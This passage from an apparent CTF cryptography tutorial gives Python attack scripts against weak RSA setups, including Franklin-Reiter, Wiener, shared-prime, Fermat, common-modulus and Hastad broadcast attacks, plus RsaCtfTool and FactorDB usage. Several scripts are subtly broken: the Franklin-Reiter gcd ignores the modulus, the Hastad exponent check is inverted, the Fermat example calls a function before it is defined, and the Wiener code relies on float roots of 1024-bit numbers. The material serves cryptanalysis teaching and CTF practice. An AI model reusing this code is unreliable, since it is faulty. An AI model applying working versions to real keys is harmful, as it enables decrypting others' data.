        e: Public exponent
    
    [Unverified] Requires polynomial manipulation libraries
    """
    # This requires symbolic computation (SageMath or sympy)
    try:
        from sympy import symbols, Poly, gcd
        from sympy.abc import x
    except ImportError:
        print("Requires sympy for polynomial operations")
        return None
    
    # Define polynomials
    # f₁(x) = x³ - c₁
    # f₂(x) = (a×x + b)³ - c₂
    
    f1 = Poly(x**e - c1, x, domain='ZZ')
    f2 = Poly((a*x + b)**e - c2, x, domain='ZZ')
    
    # Compute GCD (should be linear if attack works)
    g = gcd(f1, f2)
    
    # If GCD is linear (degree 1), extract root
    if g.degree() == 1:
        # Solve g(x) = 0 mod n
        coeffs = g.all_coeffs()
        # g(x) = coeffs[0]*x + coeffs[1]
        # x = -coeffs[1] / coeffs[0] mod n
        m1 = (-coeffs[1] * pow(int(coeffs[0]), -1, n)) % n
        return m1
    
    return None

# Example scenario
def franklin_reiter_example():
    """
    Example: Encrypted message with known prefix/suffix
    """
    from Crypto.PublicKey import RSA
    
    key = RSA.generate(1024, e=3)
    
    # Original message
    m1_bytes = b"secret"
    m1 = int.from_bytes(m1_bytes, 'big')
    
    # Related message: M₂ = M₁ + 1000 (added known suffix)
    m2 = m1 + 1000
    
    # Encrypt both
    c1 = pow(m1, 3, key.n)
    c2 = pow(m2, 3, key.n)
    
    print(f"M₁: {m1}")
    print(f"M₂: {m2} (= M₁ + 1000)")
    print(f"C₁: {c1}")
    print(f"C₂: {c2}")
    
    # Attack with known relation: M₂ = 1×M₁ + 1000
    recovered = franklin_reiter_attack(c1, c2, key.n, a=1, b=1000, e=3)
    
    if recovered:
        print(f"\n[ATTACK SUCCESS]")
        print(f"Recovered M₁: {recovered}")
        recovered_bytes = recovered.to_bytes((recovered.bit_length() + 7) // 8, 'big')
        print(f"Recovered message: {recovered_bytes}")

# Uncomment to run (requires sympy)
# franklin_reiter_example()
```

#### Wiener's Attack (Small d)

**Attack Concept**

```
[Inference] When private exponent d is small (d < n^0.25), 
Wiener's attack can recover d using continued fractions.

Vulnerability occurs when:
- d < (1/3) × n^(1/4)
- Often happens when trying to speed up decryption

Attack uses continued fraction expansion of e/n
```

**Implementation**

```python
def continued_fractions(numerator, denominator):
    """
    Generate continued fraction convergents of numerator/denominator
    """
    convergents = []
    
    # Generate continued fraction coefficients
    while denominator:
        quotient = numerator // denominator
        convergents.append(quotient)
        numerator, denominator = denominator, numerator - quotient * denominator
    
    return convergents

def convergents_from_cf(cf):
    """
    Convert continued fraction to convergents (p/q)
    """
    convergents = []
    
    for i in range(len(cf)):
        if i == 0:
            num, den = cf[0], 1
        elif i == 1:
            num, den = cf[1] * cf[0] + 1, cf[1]
        else:
            num = cf[i] * convergents[i-1][0] + convergents[i-2][0]
            den = cf[i] * convergents[i-1][1] + convergents[i-2][1]
        
        convergents.append((num, den))
    
    return convergents

def wiener_attack(e, n):
    """
    Wiener's attack on RSA with small d
    
    Returns private exponent d if found, None otherwise
    """
    from math import isqrt
    
    # Compute continued fraction of e/n
    cf = continued_fractions(e, n)
    convergents = convergents_from_cf(cf)
    
    for k, d in convergents:
        if k == 0:
            continue
        
        # Check if this d works
        # If ed = 1 + k×φ(n), then φ(n) = (ed - 1) / k
        
        if (e * d - 1) % k != 0:
            continue
        
        phi = (e * d - 1) // k
        
        # φ(n) = (p-1)(q-1) = n - (p+q) + 1
        # So: p + q = n - φ(n) + 1
        
        s = n - phi + 1  # p + q
        
        # Solve: x² - sx + n = 0
        # Discriminant: s² - 4n
        
        discriminant = s * s - 4 * n
        
        if discriminant < 0:
            continue
        
        sqrt_disc = isqrt(discriminant)
        
        if sqrt_disc * sqrt_disc != discriminant:
            continue
        
        # Calculate p and q
        p = (s + sqrt_disc) // 2
        q = (s - sqrt_disc) // 2
        
        # Verify
        if p * q == n:
            print(f"[WIENER ATTACK SUCCESS]")
            print(f"Found d: {d}")
            print(f"Found p: {p}")
            print(f"Found q: {q}")
            return d
    
    return None

# Example: Generate vulnerable key
def generate_wiener_vulnerable_key():
    """
    Generate RSA key vulnerable to Wiener's attack
    """
    from Crypto.Util.number import getPrime, inverse
    import random
    
    # Generate primes
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    phi = (p - 1) * (q - 1)
    
    # Choose small d (vulnerable)
    d = random.randint(1, int(n ** 0.25))
    
    # Compute corresponding e
    try:
        e = inverse(d, phi)
    except:
        return generate_wiener_vulnerable_key()  # Try again
    
    print(f"Generated vulnerable key:")
    print(f"n: {n}")
    print(f"e: {e}")
    print(f"d: {d} (small!)")
    print(f"d bit length: {d.bit_length()}")
    print(f"n^0.25 bit length: {int(n ** 0.25).bit_length()}")
    
    return n, e, d

# Test Wiener's attack
n, e, d_original = generate_wiener_vulnerable_key()

print(f"\n{'='*60}")
print("Attempting Wiener's attack...")
print('='*60)

d_recovered = wiener_attack(e, n)

if d_recovered:
    print(f"\nOriginal d: {d_original}")
    print(f"Recovered d: {d_recovered}")
    print(f"Match: {d_original == d_recovered}")
else:
    print("\nWiener's attack failed (d might not be small enough)")
```

#### Common Factor Attack (Shared Prime)

**Attack Concept**

```
If two different moduli share a common prime factor:
n₁ = p × q₁
n₂ = p × q₂

Then: gcd(n₁, n₂) = p

This breaks both keys instantly!
```

**Implementation**

```python
from math import gcd as math_gcd

def common_factor_attack(n1, n2):
    """
    Check if two moduli share a common factor
    """
    common = math_gcd(n1, n2)
    
    if common > 1 and common < n1:
        print(f"[ATTACK SUCCESS] Found common factor")
        print(f"p = {common}")
        
        q1 = n1 // common
        q2 = n2 // common
        
        print(f"n₁ = {common} × {q1}")
        print(f"n₂ = {common} × {q2}")
        
        return {
            'p': common,
            'q1': q1,
            'q2': q2
        }
    
    print("[ATTACK FAILED] No common factor found")
    return None

def batch_common_factor_attack(moduli_list):
    """
    Check multiple moduli for common factors (CTF scenario)
    """
    print(f"Checking {len(moduli_list)} moduli for common factors...")
    
    vulnerable_pairs = []
    
    for i in range(len(moduli_list)):
        for j in range(i + 1, len(moduli_list)):
            common = math_gcd(moduli_list[i], moduli_list[j])
            
            if common > 1 and common < moduli_list[i]:
                print(f"\n[FOUND] n_{i} and n_{j} share factor:")
                print(f"p = {common}")
                vulnerable_pairs.append((i, j, common))
    
    return vulnerable_pairs

# Example
from Crypto.Util.number import getPrime

# Generate keys with shared prime (vulnerability)
p_shared = getPrime(512)
q1 = getPrime(512)
q2 = getPrime(512)

n1 = p_shared * q1
n2 = p_shared * q2

print("Testing common factor attack...")
print(f"n₁: {n1}")
print(f"n₂: {n2}")

result = common_factor_attack(n1, n2)

if result:
    # Can now reconstruct both private keys
    e = 65537
    phi1 = (result['p'] - 1) * (result['q1'] - 1)
    phi2 = (result['p'] - 1) * (result['q2'] - 1)
    
    d1 = pow(e, -1, phi1)
    d2 = pow(e, -1, phi2)
    
    print(f"\nRecovered private exponents:")
    print(f"d₁: {d1}")
    print(f"d₂: {d2}")
```

#### Fermat's Factorization (Close Primes)

**Attack Concept**

```
When p and q are close in value (p ≈ q):
n = p × q ≈ p²

Can factor quickly using Fermat's method:
1. Start with a = ceil(√n)
2. Check if a² - n is a perfect square (b²)
3. If yes: p = a + b, q = a - b
4. If no: increment a and repeat
```

**Implementation**

```python
from math import isqrt

def fermat_factorization(n, max_iterations=100000):
    """
    Fermat's factorization method
    Works when p and q are close
    """
    a = isqrt(n) + 1
    b2 = a * a - n
    
    for _ in range(max_iterations):
        b = isqrt(b2)
        
        if b * b == b2:
            # Found factorization
            p = a + b
            q = a - b
            
            if p * q == n:
                print(f"[FERMAT SUCCESS]")
                print(f"p = {p}")
                print(f"q = {q}")
                print(f"Iterations: {_}")
                return p, q
        
        a += 1
        b2 = a * a - n
    
    print(f"[FERMAT FAILED] after {max_iterations} iterations")
    return None, None

# Example: Close primes
from Crypto.Util.number import getPrime

# Generate close primes (vulnerable)
p = getPrime(512)
q = p + 2  # Very close!

while not isPrime(q):
    q += 2

n = p * q

print(f"Testing Fermat factorization...")
print(f"n = {n}")
print(f"|p - q| = {abs(p - q)}")

p_recovered, q_recovered = fermat_factorization(n)

if p_recovered:
    print(f"\nOriginal p: {p}")
    print(f"Recovered p: {p_recovered}")
    print(f"Match: {p == p_recovered or p == q_recovered}")

def isPrime(n):
    """Simple primality check"""
    if n < 2:
        return False
    if n == 2:
        return True
    if n % 2 == 0:
        return False
    for i in range(3, isqrt(n) + 1, 2):
        if n % i == 0:
            return False
    return True
```

#### Automated Attack Tools

**RsaCtfTool**

```bash
# Installation
git clone https://github.com/Ganapati/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt

# Basic usage with public key
python3 RsaCtfTool.py --publickey public.pem --private

# With ciphertext
python3 RsaCtfTool.py --publickey public.pem --uncipherfile ciphertext.txt

# Multiple public keys (common factor attack)
python3 RsaCtfTool.py --publickey key1.pem --publickey key2.pem --private

# Specify attack type
python3 RsaCtfTool.py --publickey public.pem --attack wiener
python3 RsaCtfTool.py --publickey public.pem --attack fermat
python3 RsaCtfTool.py --publickey public.pem --attack pastctfprimes

# With n and e directly
python3 RsaCtfTool.py -n 12345... -e 65537 --private

# Output private key to file
python3 RsaCtfTool.py --publickey public.pem --private --output private.pem

# Verbose mode
python3 RsaCtfTool.py --publickey public.pem --verbose
```

**FactorDB**

```python
import requests

def check_factordb(n):
    """
    Check if n is in FactorDB (online integer factorization database)
    """
    url = f"http://factordb.com/api?query={n}"
    
    try:
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if data['status'] == 'FF':  # Fully factored
            print(f"[FACTORDB] n is fully factored!")
            
            # Parse factors
            factors_str = data['factors']
            # Format: [[factor1, exponent1], [factor2, exponent2], ...]
            
            print(f"Factors: {factors_str}")
            return factors_str
        elif data['status'] == 'CF':
            print(f"[FACTORDB] n is composite but not fully factored")
        elif data['status'] == 'P':
            print(f"[FACTORDB] n is prime")
        else:
            print(f"[FACTORDB] Status: {data['status']}")
        
        return None
    except Exception as e:
        print(f"Error querying FactorDB: {e}")
        return None

# Usage
n = 123456789012345678901234567890
check_factordb(n)
```

---

**Important Related Topics:**

- RSA-CRT fault attacks (Bellcore attack)
- Timing attacks on RSA implementations
- Padding oracle attacks (Bleichenbacher, ROBOT)
- Lattice-based attacks on RSA (Coppersmith's theorem)
- Multi-prime RSA and its vulnerabilities
- RSA key generation weaknesses (weak random number generators)

---

### Common Modulus Attack

The Common Modulus Attack exploits a scenario where the same RSA modulus `n` is used with multiple public exponents, allowing an attacker to recover the plaintext without the private key. This occurs when different entities share the same modulus—a critical implementation error.

#### Attack Prerequisites

```python
def common_modulus_requirements():
    """
    Common Modulus Attack prerequisites:
    1. Same modulus n used by multiple recipients
    2. Different public exponents e1, e2 (coprime: gcd(e1, e2) = 1)
    3. Same plaintext m encrypted with both exponents
    4. Attacker has access to both ciphertexts c1, c2
    """
    print("[Common Modulus Attack Prerequisites]")
    print("• Shared modulus n across multiple key pairs")
    print("• Different public exponents e1, e2 (must be coprime)")
    print("• c1 = m^e1 mod n")
    print("• c2 = m^e2 mod n")
    print("• Attacker knows: n, e1, e2, c1, c2")
    print("• Goal: Recover m without private key")
```

#### Attack Mechanics

The attack uses the Extended Euclidean Algorithm to find integers `a` and `b` such that:

```
a·e1 + b·e2 = gcd(e1, e2) = 1
```

Then:

```
m = (c1^a · c2^b) mod n
```

**Proof:**

```
c1 = m^e1 mod n  →  c1^a = m^(a·e1) mod n
c2 = m^e2 mod n  →  c2^b = m^(b·e2) mod n

c1^a · c2^b = m^(a·e1 + b·e2) = m^1 = m mod n
```

#### Python Implementation

```python
def extended_gcd(a, b):
    """
    Extended Euclidean Algorithm
    Returns: (gcd, x, y) where a*x + b*y = gcd
    """
    if b == 0:
        return a, 1, 0
    else:
        gcd, x, y = extended_gcd(b, a % b)
        return gcd, y, x - (a // b) * y

def common_modulus_attack(n, e1, e2, c1, c2):
    """
    Recover plaintext m from two RSA ciphertexts using same modulus
    n: RSA modulus
    e1, e2: different public exponents (must be coprime)
    c1: ciphertext from encryption with e1
    c2: ciphertext from encryption with e2
    Returns: plaintext m
    """
    print("[Common Modulus Attack]")
    print(f"n = {n}")
    print(f"e1 = {e1}, e2 = {e2}")
    print(f"c1 = {c1}")
    print(f"c2 = {c2}")
    
    # Verify exponents are coprime
    gcd, a, b = extended_gcd(e1, e2)
    
    if gcd != 1:
        print(f"[Error: gcd(e1, e2) = {gcd} ≠ 1—exponents not coprime]")
        return None
    
    print(f"\nExtended GCD: {a}·e1 + {b}·e2 = 1")
    print(f"{a}·{e1} + {b}·{e2} = {a*e1 + b*e2}")
    
    # Compute m = c1^a · c2^b mod n
    # Handle negative exponents
    if a < 0:
        c1_part = pow(c1, -a, n)  # c1^(-a) mod n
        c1_part = pow(c1_part, -1, n)  # (c1^(-a))^(-1) = c1^a mod n
        print(f"c1^a = c1^({a}) = (c1^{-a})^-1 mod n")
    else:
        c1_part = pow(c1, a, n)
        print(f"c1^a = c1^{a} mod n")
    
    if b < 0:
        c2_part = pow(c2, -b, n)
        c2_part = pow(c2_part, -1, n)
        print(f"c2^b = c2^({b}) = (c2^{-b})^-1 mod n")
    else:
        c2_part = pow(c2, b, n)
        print(f"c2^b = c2^{b} mod n")
    
    # Recover plaintext
    m = (c1_part * c2_part) % n
    print(f"\nm = (c1^a · c2^b) mod n = {m}")
    
    # Try to convert to ASCII
    try:
        plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big')
        print(f"Plaintext: {plaintext}")
        return plaintext
    except:
        print(f"Plaintext (integer): {m}")
        return m

# Example CTF scenario
if __name__ == "__main__":
    # Setup (Alice and Bob share modulus n with different exponents)
    from Crypto.Util.number import getPrime
    
    # Generate RSA modulus (small for demonstration)
    p = getPrime(16)
    q = getPrime(16)
    n = p * q
    phi_n = (p - 1) * (q - 1)
    
    # Alice uses e1
    e1 = 65537
    
    # Bob uses e2 (different from e1, coprime to phi_n)
    e2 = 257
    
    # Verify coprimality
    from math import gcd
    if gcd(e1, e2) != 1:
        print("[Error: e1 and e2 not coprime—attack may fail]")
    
    # Plaintext to encrypt
    m = 12345
    
    # Encrypt with both exponents
    c1 = pow(m, e1, n)
    c2 = pow(m, e2, n)
    
    print(f"Original plaintext: {m}")
    print(f"n = {n}\n")
    
    # Execute attack
    recovered = common_modulus_attack(n, e1, e2, c1, c2)
    
    if recovered == m:
        print("\n[Success: Plaintext recovered!]")
    else:
        print(f"\n[Verification: {recovered} == {m} ? {recovered == m}]")
```

#### Attack Variants

**Variant 1: Three or More Ciphertexts**

If three ciphertexts encrypted with coprime exponents are available, the attack extends:

```python
def common_modulus_three_ciphertexts(n, exponents, ciphertexts):
    """
    [Inference] - Extend common modulus attack to three or more ciphertexts
    Uses generalized Chinese Remainder Theorem
    """
    print("[Common Modulus Attack: 3+ Ciphertexts]")
    print(f"Exponents: {exponents}")
    
    # Verify all pairs are coprime
    from math import gcd
    for i in range(len(exponents)):
        for j in range(i+1, len(exponents)):
            if gcd(exponents[i], exponents[j]) != 1:
                print(f"[Warning: e{i} and e{j} not coprime]")
    
    # For three exponents: Use CRT-like approach
    # [Unverified] - Full implementation requires advanced number theory
    print("[Algorithm: Solve system using generalized CRT]")
    print("[Feasible but computationally complex—use existing tools]")

# Example
exponents = [65537, 257, 313]
ciphertexts = [1234, 5678, 9012]
n = 123456789

common_modulus_three_ciphertexts(n, exponents, ciphertexts)
```

**Variant 2: Partial Key Recovery**

If multiple ciphertexts with the same modulus are available, even without complete coprimality conditions, information leakage occurs:

```python
def common_modulus_information_leakage(n, pairs):
    """
    [Inference] - Analyze information leakage from multiple (e, c) pairs
    pairs: list of (e, c) tuples
    """
    print("[Common Modulus: Information Leakage Analysis]")
    
    for i, (e1, c1) in enumerate(pairs):
        for j, (e2, c2) in enumerate(pairs[i+1:], i+1):
            from math import gcd
            g = gcd(e1, e2)
            
            print(f"\nPair {i}-{j}: gcd({e1}, {e2}) = {g}")
            
            if g > 1:
                print(f"  [Exponents share factor {g}—possible attack vector]")
            else:
                print(f"  [Exponents coprime—vulnerable to common modulus attack]")
```

#### CTF Exploitation Strategy

1. **Identify shared modulus**: Look for multiple RSA public keys with identical `n`.
2. **Verify exponent coprimality**: Check gcd(e1, e2) = 1.
3. **Collect ciphertexts**: Obtain c1 and c2 (same plaintext encrypted differently).
4. **Apply extended GCD**: Find coefficients a, b.
5. **Compute plaintext**: m = (c1^a · c2^b) mod n.
6. **Convert to ASCII**: Interpret integer as plaintext bytes.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Two RSA public keys share modulus; recover plaintext

n = 11137568879437
e1 = 65537
e2 = 257
c1 = 7834657324567
c2 = 2341652987654

# Attack
from math import gcd

def extended_gcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = extended_gcd(b, a % b)
    return g, y, x - (a // b) * y

gcd_val, a, b = extended_gcd(e1, e2)
print(f"gcd({e1}, {e2}) = {gcd_val}")
print(f"Coefficients: a={a}, b={b}")

# Compute c1^a mod n
if a >= 0:
    c1_part = pow(c1, a, n)
else:
    # Modular inverse for negative exponent
    c1_inv = pow(c1, -1, n)
    c1_part = pow(c1_inv, -a, n)

# Compute c2^b mod n
if b >= 0:
    c2_part = pow(c2, b, n)
else:
    c2_inv = pow(c2, -1, n)
    c2_part = pow(c2_inv, -b, n)

# Recover plaintext
m = (c1_part * c2_part) % n
print(f"\nRecovered plaintext (integer): {m}")

# Convert to ASCII
try:
    plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()
    print(f"Plaintext: {plaintext}")
except:
    print(f"Plaintext (hex): {hex(m)}")
EOF
```

---

### Hastad's Broadcast Attack

Hastad's Broadcast Attack (also called Low Exponent Attack or Common Plaintext Attack) exploits scenarios where the same plaintext is encrypted with the same small public exponent `e` but different RSA moduli. This is a critical vulnerability when `e < number of messages`.

#### Attack Mechanics

**Setup:**

```
Same plaintext m encrypted to k recipients:
c_i = m^e mod n_i  for i = 1, 2, ..., k

If k ≥ e: Attacker can recover m using CRT
```

**Mathematical Basis:**

When `k ≥ e`, the attacker has `k` congruences:

```
c_1 ≡ m^e (mod n_1)
c_2 ≡ m^e (mod n_2)
...
c_k ≡ m^e (mod n_k)
```

By the Chinese Remainder Theorem:

```
x ≡ m^e (mod N)  where N = n_1 · n_2 · ... · n_k
```

Since `m < min(n_i)`, we have `m^e < N`, thus:

```
x = m^e (exact equality, not modular)
m = e-th root of x
```

#### Python Implementation

```python
def chinese_remainder_theorem(remainders, moduli):
    """
    Solve system of congruences using CRT
    x ≡ remainders[i] (mod moduli[i])
    Returns: (x, product of moduli)
    """
    print("[Chinese Remainder Theorem]")
    
    if len(remainders) != len(moduli):
        raise ValueError("Remainders and moduli must have same length")
    
    # Start with first congruence
    x = remainders[0]
    M = moduli[0]
    
    # Iteratively apply CRT
    for i in range(1, len(remainders)):
        # Find solution to:
        # x ≡ x_old (mod M)
        # x ≡ remainders[i] (mod moduli[i])
        
        r_i = remainders[i]
        m_i = moduli[i]
        
        # Use extended GCD
        def extended_gcd(a, b):
            if b == 0:
                return a, 1, 0
            g, x, y = extended_gcd(b, a % b)
            return g, y, x - (a // b) * y
        
        g, p, q = extended_gcd(M, m_i)
        
        if g != 1:
            raise ValueError(f"Moduli {M} and {m_i} not coprime")
        
        # Combined solution
        lcm = (M * m_i) // g
        x = (x * m_i * q + r_i * M * p) % lcm
        M = lcm
    
    print(f"CRT: Found x mod {M}")
    return x, M

def integer_eth_root(x, e):
    """
    Compute e-th root of integer x (Newton's method)
    Returns: m such that m^e ≈ x
    """
    print(f"[Computing {e}-th root of {x}]")
    
    if e == 1:
        return x
    
    # Newton's method: m_{n+1} = (1/e)·((e-1)·m_n + x/m_n^(e-1))
    m = int(x ** (1/e)) + 1  # Initial guess
    
    for iteration in range(100):  # Max 100 iterations
        m_prev = m
        m_new = ((e - 1) * m + x // (m ** (e - 1))) // e
        
        if m_new == m_prev:
            break
        m = m_new
    
    # Verify
    if m ** e == x:
        print(f"Root found: {m}")
        return m
    else:
        print(f"[Warning: m^{e} = {m**e} ≠ {x}]")
        return m

def hastad_broadcast_attack(public_keys, ciphertexts, exponent):
    """
    Execute Hastad's Broadcast Attack
    public_keys: list of (n_i, e_i) tuples
    ciphertexts: list of c_i values
    exponent: e (should be same for all keys)
    Returns: recovered plaintext m
    """
    print("[Hastad's Broadcast Attack]")
    print(f"Number of ciphertexts: {len(ciphertexts)}")
    print(f"Exponent: {exponent}")
    
    # Verify exponent is small
    if exponent >= len(ciphertexts):
        print(f"[Warning: exponent {exponent} >= number of messages {len(ciphertexts)}]")
        print("[Attack may fail—need more ciphertexts]")
        return None
    
    # Extract moduli
    moduli = [n for n, e in public_keys]
    
    # Verify all exponents are the same
    exponents = [e for n, e in public_keys]
    if not all(e == exponent for e in exponents):
        print("[Error: Not all exponents match]")
        return None
    
    print(f"\nExtracted moduli: {len(moduli)} RSA moduli")
    print(f"Moduli sizes: {[len(bin(n)) for n in moduli]} bits")
    
    # Apply CRT
    try:
        x, N = chinese_remainder_theorem(ciphertexts, moduli)
    except Exception as e:
        print(f"[CRT failed: {e}]")
        return None
    
    print(f"\nCRT result: x mod N where N = ∏n_i")
    print(f"N has {len(bin(N))} bits")
    print(f"x = {x}")
    
    # Compute e-th root
    m = integer_eth_root(x, exponent)
    
    # Convert to ASCII
    try:
        plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big')
        print(f"\nRecovered plaintext: {plaintext}")
        return plaintext
    except:
        print(f"Plaintext (integer): {m}")
        return m

# Example CTF scenario
if __name__ == "__main__":
    print("[Hastad's Broadcast Attack Example]\n")
    
    # Simulate three recipients with same plaintext, small exponent
    from Crypto.Util.number import getPrime
    
    e = 3  # Small exponent
    plaintext = b"FLAG"
    m = int.from_bytes(plaintext, 'big')
    
    print(f"Original plaintext: {plaintext} (integer: {m})")
    print(f"Exponent: {e}\n")
    
    # Generate RSA keys for 3 recipients
    public_keys = []
    ciphertexts = []
    
    for i in range(3):
        p = getPrime(256)
        q = getPrime(256)
        n = p * q
        public_keys.append((n, e))
        
        c = pow(m, e, n)
        ciphertexts.append(c)
        
        print(f"Recipient {i+1}: n = {n}, e = {e}")
        print(f"  Ciphertext: c = {c}\n")
    
    # Execute attack
    recovered = hastad_broadcast_attack(public_keys, ciphertexts, e)
    
    if recovered == plaintext:
        print("\n[Success: Plaintext recovered via Hastad's attack!]")
    else:
        print(f"\n[Recovered: {recovered}]")
```

#### Attack Variants

**Variant 1: Padded Messages**

If plaintext is padded (e.g., OAEP), attack becomes more complex but still feasible:

```python
def hastad_padded_variant(public_keys, ciphertexts, exponent):
    """
    [Inference] - Hastad's attack on padded messages
    If padding is additive (m' = m + r_i where r_i small):
    Can still recover m through CRT if padding differences are known
    """
    print("[Hastad's Attack: Padded Messages Variant]")
    print("[Feasible if padding is additive and differences are recoverable]")
    print("[Requires: Knowing or guessing padding values]")
    print("[Complexity increases but attack may still succeed]")
```

**Variant 2: Correlated Plaintexts**

If plaintexts are correlated (e.g., incremental) rather than identical:

```python
def hastad_correlated_messages(public_keys, ciphertexts, exponent):
    """
    [Inference] - Hastad's attack extended to correlated messages
    If m_i = m + r_i where r_i are small or known:
    Can still apply CRT-based recovery
    """
    print("[Hastad's Attack: Correlated Messages]")
    print("[Extended variant: messages differ by small amount]")
    print("[Requires: Knowledge or assumption about message relationship]")
    print("[Attack feasible if correlation structure is known]")
```

#### CTF Exploitation Strategy

1. **Identify broadcast scenario**: Multiple RSA keys encrypting same plaintext.
2. **Verify small exponent**: Check if e < number of ciphertexts.
3. **Extract RSA moduli**: Parse all public keys to get n_i values.
4. **Apply CRT**: Combine ciphertexts to get x where x ≡ m^e (mod N).
5. **Compute e-th root**: Find m = e-th root of x.
6. **Convert to text**: Interpret m as plaintext bytes.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Same plaintext broadcasted to 3 recipients with e=3

# Public keys
keys = [
    (11137568879437, 3),
    (11137568879391, 3),
    (11137568879347, 3),
]

# Ciphertexts
ciphertexts = [
    7834657324567,
    2341652987654,
    5678234156789,
]

# Attack setup
from math import gcd

def extended_gcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = extended_gcd(b, a % b)
    return g, y, x - (a // b) * y

def crt_combine(remainders, moduli):
    """Simple CRT for two moduli"""
    if len(remainders) == 2:
        r1, r2 = remainders
        m1, m2 = moduli
        g, p, q = extended_gcd(m1, m2)
        if g != 1:
            return None
        return (r1 * m2 * q + r2 * m1 * p) % (m1 * m2)
    else:
        # Recursive for 3+ moduli
        combined = crt_combine(remainders[:2], moduli[:2])
        combined_mod = moduli[0] * moduli[1]
        return crt_combine([combined, remainders[2]], [combined_mod, moduli[2]])

# Apply CRT
moduli = [n for n, e in keys]
x = crt_combine(ciphertexts, moduli)

print(f"CRT result: {x}")

# Compute cubic root (e=3)
m = int(round(x ** (1/3)))

# Verify and adjust if needed
while m ** 3 != x:
    if m ** 3 > x:
        m -= 1
    else:
        m += 1

print(f"Plaintext (integer): {m}")

# Convert to ASCII
plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big')
print(f"Plaintext: {plaintext}")
EOF
```

---

### Wiener's Attack

Wiener's Attack targets RSA with a small private exponent `d`. If `d < n^(1/4) / 3`, the attack recovers the private key in polynomial time through continued fraction analysis.

#### Attack Mathematics

**Key Observation:**

In RSA, `e·d ≡ 1 (mod φ(n))`, meaning:

```
e·d = 1 + k·φ(n)  for some integer k
```

Rearranging:

```
e/φ(n) = (1 + k·φ(n)) / (d·φ(n)) ≈ k/d  (if d is small)
```

For small `d`, the fraction `k/d` is a good rational approximation to `e/n`. The continued fraction expansion of `e/n` contains `k/d` as a convergent.

**Algorithm:**

1. Compute continued fraction expansion of `e/n`.
2. For each convergent `k_i/d_i`:
    - Compute `φ(n) = (e·d_i - 1) / k_i`
    - Solve quadratic: `x² - (n - φ(n) + 1)x + n = 0`
    - If integer solutions exist, factors of n are found.

#### Python Implementation

```python
def continued_fraction_expansion(numerator, denominator, max_terms=None):
    """
    Compute continued fraction expansion of numerator/denominator
    Returns: list of terms [a0, a1, a2, ...]
    """
    if max_terms is None:
        max_terms = 100
    
    terms = []
    a, b = numerator, denominator
    
    for _ in range(max_terms):
        if b == 0:
            break
        
        q = a // b
        terms.append(q)
        a, b = b, a - q * b
    
    return terms

def convergents_from_cf(cf_terms):
    """
    Generate convergents from continued fraction terms
    Convergents are rational approximations
    """
    convergents = []
    
    for i in range(len(cf_terms)):
        if i == 0:
            h, k = cf_terms[0], 1
        elif i == 1:
            h = cf_terms[1] * cf_terms[0] + 1
            k = cf_terms[1]
        else:
            h = cf_terms[i] * convergents[i-1][0] + convergents[i-2][0]
            k = cf_terms[i] * convergents[i-1][1] + convergents[i-2][1]
        
        convergents.append((h, k))
    
    return convergents

def wiener_attack(n, e):
    """
    Execute Wiener's Attack to recover private exponent d
    Recovers d if d < n^(1/4) / 3
    Also recovers p, q (factors of n) if successful
    """
    print("[Wiener's Attack]")
    print(f"n = {n}")
    print(f"e = {e}")
    
    # Compute continued fraction expansion of e/n
    print("\n[Computing continued fraction of e/n...]")
    cf = continued_fraction_expansion(e, n)
    print(f"CF terms (first 20): {cf[:20]}")
    
    # Generate convergents
    convergents = convergents_from_cf(cf)
    print(f"\nGenerated {len(convergents)} convergents")
    
    # Test each convergent
    for i, (k, d) in enumerate(convergents):
        if k == 0:
            continue
        
        print(f"\n[Testing convergent {i}: k={k}, d={d}]")
        
        # Check if (e·d - 1) % k == 0
        if (e * d - 1) % k != 0:
            print(f"  (e·d - 1) % k ≠ 0—skip")
            continue
        
        # Compute φ(n)
        phi = (e * d - 1) // k
        
        # Solve: x² - (n - φ(n) + 1)x + n = 0
        # Using quadratic formula: x = (b ± √(b² - 4ac)) / 2a
        a = 1
        b = -(n - phi + 1)
        c = n
        
        discriminant = b * b - 4 * a * c
        
        if discriminant < 0:
            print(f"  Discriminant < 0—no real solutions")
            continue
        
        # Check if discriminant is perfect square
        sqrt_disc = int(discriminant ** 0.5)
        if sqrt_disc * sqrt_disc != discriminant:
            print(f"  Discriminant {discriminant} is not perfect square")
            continue
        
        # Compute roots
        p = (-b + sqrt_disc) // (2 * a)
        q = (-b - sqrt_disc) // (2 * a)
        
        # Verify p and q are valid factors
        if p * q == n:
            print(f"  [Success!] Factors found:")
            print(f"  p = {p}")
            print(f"  q = {q}")
            print(f"  d = {d}")
            
            # Verify d is private exponent
            phi_verify = (p - 1) * (q - 1)
            if (e * d) % phi_verify == 1:
                print(f"  [Verified: e·d ≡ 1 (mod φ(n))]")
                return d, p, q
            else:
                print(f"  [Invalid d—does not satisfy e·d ≡ 1 (mod φ(n))]")
                continue
    
    print("\n[Attack failed—d likely not in vulnerable range]")
    return None

# Example CTF scenario
if __name__ == "__main__":
    from Crypto.Util.number import getPrime, getRandomRange
    
    print("[Wiener's Attack Example]\n")
    
    # Generate RSA with small private exponent
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    phi_n = (p - 1) * (q - 1)
    
    # Choose small d (vulnerable range)
    d = getRandomRange(1, n ** 0.25 // 3)
    
    # Compute e
    def extended_gcd(a, b):
        if b == 0:
            return a, 1, 0
        g, x, y = extended_gcd(b, a % b)
        return g, y, x - (a // b) * y
    
    _, e_inv, _ = extended_gcd(d, phi_n)
    e = e_inv % phi_n
    
    print(f"Generated RSA:")
    print(f"p = {p}")
    print(f"q = {q}")
    print(f"n = {n}")
    print(f"φ(n) = {phi_n}")
    print(f"d = {d} (private exponent)")
    print(f"e = {e} (public exponent)")
    print(f"\nVulnerability: d < n^(1/4) / 3 = {int(n ** 0.25 / 3)}")
    print(f"Actual d = {d}, Threshold = {int(n ** 0.25 / 3)}")
    if d < n ** 0.25 / 3:
        print("[VULNERABLE to Wiener's Attack]\n")
    
    # Execute attack
